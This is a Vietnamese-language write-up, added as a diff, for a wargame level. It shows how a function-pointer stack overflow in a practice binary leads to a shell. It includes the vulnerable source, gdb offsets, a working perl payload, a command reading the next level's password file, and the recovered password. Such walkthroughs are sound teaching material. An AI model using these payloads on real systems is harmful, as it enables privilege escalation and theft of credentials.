@@ -1,0 +1,62 @@
+Level 3 - Tràn bộ đệm trên stack, ghi đè con trỏ hàm (không cần vượt qua stack canary/return address)
+
+Source liên quan (level03.c):
+  void good() { puts("Win."); execl("/bin/sh", "sh", NULL); }
+  void bad()  { printf("I'm so sorry, you're at %p and you want to be at %p\n", bad, good); }
+  int main(int argc, char **argv, char **envp) {
+      void (*functionpointer)(void) = bad;   // biến con trỏ hàm, nằm ở ebp-0xc
+      char buffer[50];                        // nằm ở ebp-0x58
+      if(argc != 2 || strlen(argv[1]) < 4) return 0;
+      memcpy(buffer, argv[1], strlen(argv[1]));       // không giới hạn theo size buffer
+      memset(buffer, 0, strlen(argv[1]) - 4);          // xoá gần hết, CHỪA 4 BYTE CUỐI
+      printf("This is exciting we're going to %p\n", functionpointer);
+      functionpointer();                                // gọi bad() hoặc good() tuỳ nội dung
+  }
+
+Lỗ hổng:
+- memcpy(buffer, argv[1], strlen(argv[1])) copy KHÔNG kiểm tra độ dài argv[1] có
+  vượt quá 50 byte (kích thước buffer) hay không. Nếu argv[1] dài hơn, phần dư
+  tràn thẳng lên biến kế tiếp trên stack - đúng vị trí "functionpointer".
+- functionpointer là 1 con trỏ hàm (4 byte) được CPU dùng trực tiếp để nhảy
+  lệnh thực thi: "mov -0xc(%ebp),%eax" rồi "call *%eax". CPU không phân biệt
+  giá trị đó là dữ liệu gốc hay dữ liệu bị ghi đè bởi attacker - nó chỉ nhảy
+  tới địa chỉ đó. Đây là kiểu tấn công "control-flow hijack qua con trỏ hàm",
+  đơn giản hơn ghi đè return address (không cần vượt qua stack canary).
+- memset(buffer, 0, strlen(argv[1]) - 4) trông "giống" 1 biện pháp dọn dẹp an
+  toàn, nhưng thực tế chỉ xoá 0 từ byte 0 đến byte (len-4), KHÔNG BAO GIỜ chạm
+  tới 4 byte cuối cùng của dữ liệu vừa memcpy - đúng 4 byte này lại rơi đúng
+  vào vị trí "functionpointer". Vì vậy memset không hề cản trở được cuộc tấn
+  công, chỉ giúp attacker không cần quan tâm nội dung các byte đệm phía trước.
+- bad() vô tình in ra địa chỉ thật của cả bad và good qua "%p" khi được gọi
+  (trường hợp functionpointer còn nguyên giá trị mặc định). Vì binary biên
+  dịch KHÔNG bật PIE/ASLR (địa chỉ hàm là hằng số cố định ngay trong mã máy,
+  ví dụ "movl $0x80484a4,-0xc(%ebp)"), địa chỉ này KHÔNG đổi giữa các lần
+  chạy - chỉ cần leak 1 lần là dùng được cho lần khai thác sau.
+- Input dùng để leak (vd "AAAA") chỉ cần thoả 2 điều kiện: độ dài >= 4 (để
+  qua được check argc/strlen) và độ dài < 76 (để KHÔNG chạm tới vị trí
+  functionpointer). Bất kỳ chuỗi nào trong khoảng độ dài 4-75 ký tự, nội dung
+  gì cũng được, đều cho kết quả leak giống hệt nhau.
+
+Cách khai thác:
+  1. cat level03.c                    (đọc source, xác định buffer[50] + functionpointer)
+  2. gdb ./level03 ; disas main       (tìm offset thật sự trên stack)
+     -> "lea -0x58(%ebp),%eax" (địa chỉ buffer, dùng cho cả memcpy và memset)
+     -> "movl $0x80484a4,-0xc(%ebp)" (địa chỉ functionpointer, giá trị mặc định = bad)
+     -> offset = 0x58 - 0xc = 0x4C = 76 byte
+  3. Leak địa chỉ good() bằng cách gọi với input ngắn (không tràn):
+     ./level03 AAAA
+     -> in ra "you're at 0x80484a4 and you want to be at 0x8048474"
+     -> bad = 0x080484a4 (khớp với giá trị disas), good = 0x08048474
+  4. Ghép payload dài đúng 80 byte (76 byte đệm + 4 byte địa chỉ good little-endian):
+     ./level03 $(perl -e 'print "A"x76 . "\x74\x84\x04\x08"')
+     -> "This is exciting we're going to 0x8048474" (đổi từ 0x80484a4 ban đầu,
+        chứng minh functionpointer đã bị ghi đè thành công)
+     -> "Win." xuất hiện, rồi shell mới (quyền level4)
+  5. Trong shell mới: id ; cat /home/level4/.pass
+
+Kỹ thuật liên quan: stack layout / biến cục bộ (ebp-relative offset), function
+                    pointer bị ghi đè, memcpy không kiểm tra bound, gdb disas
+                    để tìm offset chính xác, thiếu PIE/ASLR gây info leak địa
+                    chỉ cố định, little-endian encoding của địa chỉ 32-bit
+
+Pass/Key: 7WhHa5HWMNRAYl9T
